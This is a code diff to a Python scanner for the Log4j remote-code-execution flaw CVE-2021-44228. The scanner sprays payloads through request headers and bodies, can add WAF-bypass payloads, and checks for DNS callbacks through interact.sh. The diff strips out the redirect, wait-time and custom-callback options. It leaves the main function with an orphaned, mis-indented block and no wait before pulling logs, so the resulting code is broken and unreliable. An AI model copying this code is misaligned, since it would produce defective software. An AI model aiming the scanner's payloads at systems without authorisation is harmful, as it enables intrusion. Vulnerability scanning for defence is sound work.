@@ -81,12 +81,6 @@ parser.add_argument("--exclude-user-agent-fuzzing",
                     dest="exclude_user_agent_fuzzing",
                     help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                     action='store_true')
-parser.add_argument("--wait-time",
-                    dest="wait_time",
-                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
-                    default=5,
-                    type=int,
-                    action='store')
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
@@ -100,10 +94,6 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
-parser.add_argument("--disable-http-redirects",
-                    dest="disable_redirects",
-                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
-                    action='store_true')
 
 args = parser.parse_args()
 
@@ -247,7 +237,6 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -262,7 +251,6 @@ def scan_url(url, callback_host):
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -276,7 +264,6 @@ def scan_url(url, callback_host):
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -286,30 +273,16 @@ def main():
     if args.url:
         urls.append(args.url)
 
-    dns_callback_host = ""
-    if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host = args.custom_dns_callback_host
-    else:
-        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
             dns_callback = Interactsh()
         else:
             raise ValueError("Invalid DNS Callback provider")
         dns_callback_host = dns_callback.domain
 
-    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
         scan_url(url, dns_callback_host)
 
-    if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
-        return
-
-    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
-    cprint("[•] Waiting...", "cyan")
-    time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
         cprint("[•] Targets do not seem to be vulnerable.", "green")
